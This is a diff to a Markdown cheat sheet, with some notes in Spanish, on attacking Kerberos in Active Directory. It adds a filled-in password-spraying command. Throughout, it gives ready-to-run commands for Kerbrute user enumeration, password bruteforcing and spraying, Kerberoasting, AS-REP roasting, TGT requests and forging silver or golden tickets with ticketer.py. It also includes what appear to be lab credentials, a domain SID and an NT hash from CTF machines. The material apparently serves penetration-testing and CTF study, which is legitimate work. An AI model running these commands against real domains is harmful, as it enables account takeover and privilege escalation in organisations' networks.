@@ -3,49 +3,49 @@ id: kerberos
 title: KERBEROS - 88
 ---
 
-### Kerbrute
+## Kerbrute
 This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
 
 ```bash
 ntpdate ip.ip.ip.ip
 ```
-##### userenum
+#### userenum
 ```bash
 kerbrute userenum --dc ip.ip.ip.ip -d domain.domain /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
 ```
-##### bruteuser
+#### bruteuser
 ```bash
 kerbrute bruteuser --dc ip.ip.ip.ip  -d domain.domain /usr/share/SecLists/Passwords/xato-net-10-million-passwords.txt usuario
 ```
-##### passwordspray
+#### passwordspray
 ```bash
-kerbrute passwordspray COMPLETAR
+kerbrute passwordspray --dc ip.ip.ip.ip -d domain.domain /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt 'Password123'
 ```
 
-### GetSID
+## GetSID
 https://www.netexec.wiki/ldap-protocol/find-domain-sid
 
 ```bash
 nxc ldap sequel.htb -u rose -p 'KxEPkKe6R8su' --get-sid
 ```
 
-### GetUserSPNs.py
+## GetUserSPNs.py
 
 https://books.spartan-cybersec.com/cpad/vulnerabilidades-y-ataques-en-ad/kerberoasting/utilizando-impacket-getuserspns
 
 Queries target domain for SPNs that are running under a user account
 
-##### ntlm
+#### ntlm
 ```bash
 GetUserSPNs.py domain.domain/USER:Password
 ```
 
-##### ntlm disabled
+#### ntlm disabled
 ```bash
 GetUserSPNs.py -k domain.domain/USER:Password -dc-host host.domain.domain
 ```
 
-##### request 
+#### request
 ```bash
 GetUserSPNs.py domain.domain/USER:Password -request
 ```
@@ -54,7 +54,7 @@ GetUserSPNs.py domain.domain/USER:Password -request
 Otra herramienta similar es: https://github.com/ShutdownRepo/targetedKerberoast
 
 
-### mssqlclient.py
+## mssqlclient.py
 TDS client implementation (SSL supported).
 
 ```bash
@@ -70,27 +70,27 @@ export KRB5CCNAME=ticketuser.ccache
 mssqlclient.py host.domain.domain -k
 ```
 
-### getTGT.py
+## getTGT.py
 Given a password, hash or aesKey, it will request a TGT and save it as ccache
 
 ```bash
 getTGT.py domain.domain/USER:Password
 ```
 
-### getPac.py
+## getPac.py
 
 ```bash
 getPac.py domain.domain/USER:Password -targetUser user
 ```
 
-### ticketer.py
+## ticketer.py
 Creates a Kerberos golden/silver tickets based on user options
 
 ```bash
 ticketer.py -spn 'MSSQLSvc/dc1.scrm.local' -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -nthash 'b999a16500b87d17ec7f2e2a68778f05' -dc-ip dc1.scrm.local -domain scrm.local Administrator
 ```
 
-### GetNPUsers.py 
+## GetNPUsers.py
 Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
 
 1. Get a TGT for a user:
